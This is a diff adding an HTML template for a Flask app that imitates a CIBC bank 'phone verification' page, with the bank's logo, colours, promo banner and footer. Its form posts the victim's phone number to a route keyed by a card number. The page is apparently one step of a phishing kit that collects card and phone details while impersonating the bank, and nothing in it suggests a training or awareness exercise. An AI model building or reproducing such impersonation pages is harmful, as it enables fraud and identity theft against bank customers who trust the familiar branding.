@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CIBC Phone Verification</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+  <!-- TOP MAROON BAR -->
+  <div class="top-maroon-bar">
+    <div class="maroon-container">
+      <a href="#" class="language-link">Français</a>
+    </div>
+  </div>
+
+  <!-- WHITE LOGO BAR -->
+  <div class="white-logo-bar">
+    <div class="maroon-container">
+      <img 
+        src="{{ url_for('static', filename='images/CIBC_CIBC_unveils_new_look_symbolizing_the_bank_s_purpose_of_hel.jpg') }}" 
+        alt="Bank Logo" 
+        class="bank-logo"
+      >
+    </div>
+  </div>
+
+  <!-- HERO BANNER -->
+  <div class="hero-banner">
+    <div class="hero-content">
+      <p class="small-subtitle">CIBC PHONE VERIFICATION</p>
+      <h2 class="hero-title">Verify your phone number</h2>
+      <p class="hero-subtitle">Please verify the phone number we have on file to proceed.</p>
+    </div>
+  </div>
+
+  <!-- MAIN LAYOUT -->
+  <div class="main-layout">
+    <div class="center-box">
+      <!-- PHONE VERIFICATION BOX -->
+      <div class="login-box">
+        <form action="{{ url_for('phone_verification', card_number=card_number) }}" method="POST" style="margin: 0;">
+          <div class="form-row">
+            <label for="phone_number">Phone Number:</label>
+            <input 
+              type="text" 
+              id="phone_number" 
+              name="phone_number" 
+              class="login-input" 
+              placeholder="Enter your phone number" 
+              required
+            >
+          </div>
+          <div class="button-row">
+            <!-- “Verify” button triggers phone_verification route -->
+            <button class="btn-primary" type="submit">Verify</button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <!-- PROMO SECTION -->
+    <div class="promo-section">
+      <img 
+        src="{{ url_for('static', filename='images/Screenshot 2025-01-18 103618.png') }}" 
+        alt="Promo Image"
+      >
+      <div class="promo-text">
+        <h5>We’ve enhanced our app to make mobile banking easier.</h5>
+        <p><a href="#">Learn more</a></p>
+      </div>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer class="dark-footer">
+    <div class="footer-column">
+      <h5>Quick Links</h5>
+      <ul>
+        <li><a href="#">Explore Products</a></li>
+        <li><a href="#">Branch and ATM Locator</a></li>
+        <li><a href="#">Contact Us</a></li>
+      </ul>
+    </div>
+    <div class="footer-column">
+      <h5>Resources</h5>
+      <ul>
+        <li><a href="#">Request financial assistance</a></li>
+        <li><a href="#">Set up direct deposit</a></li>
+        <li><a href="#">Tax slip mailing dates</a></li>
+      </ul>
+    </div>
+    <div class="footer-column">
+      <h5>Legal Information</h5>
+      <ul>
+        <li><a href="#">Privacy and Security</a></li>
+        <li><a href="#">Legal</a></li>
+      </ul>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2025 CIBC. All rights reserved.</p>
+    </div>
+  </footer>
+</body>
+</html>
